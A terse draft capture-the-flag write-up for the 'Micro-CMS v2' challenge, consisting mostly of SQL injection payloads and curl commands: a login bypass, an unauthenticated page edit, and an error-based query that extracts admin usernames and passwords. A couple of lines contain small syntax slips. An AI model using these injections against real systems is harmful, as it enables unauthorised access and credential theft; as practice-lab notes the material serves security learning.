+++
draft = true
date = 2019-11-22T22:19:21+01:00
title = "Micro-CMS v2"
tags = ["CTF"]
+++

Flag 0

```sql
' or true union all select '123' order by password asc limit 1 -- -+
```

```bash
PAYLOAD="username=$SQL&password=123
```

```bash
curl -d $PAYLOAD -v $TARGET/login
```

Flag 1

```bash
curl -v -d 'title=123&body=324' $TARGET/page/edit/3
```

Flag 2

```sql
(select 1 from
    (select count(*), concat(
        (select
            (select
                (SELECT concat(0x7e, 0x27, cast(admins.username as char), 0x27, 0x7e) FROM `level2`.admins LIMIT 0,1)
            ) from information_schema.tables limit 0,1
        ), floor(rand(0)*2)
     ) x from information_schema.table s group by x ) a
)
```

then the same but with `admins.password` field.

## Links

https://github.com/swisskyrepo/PayloadsAllTheThings
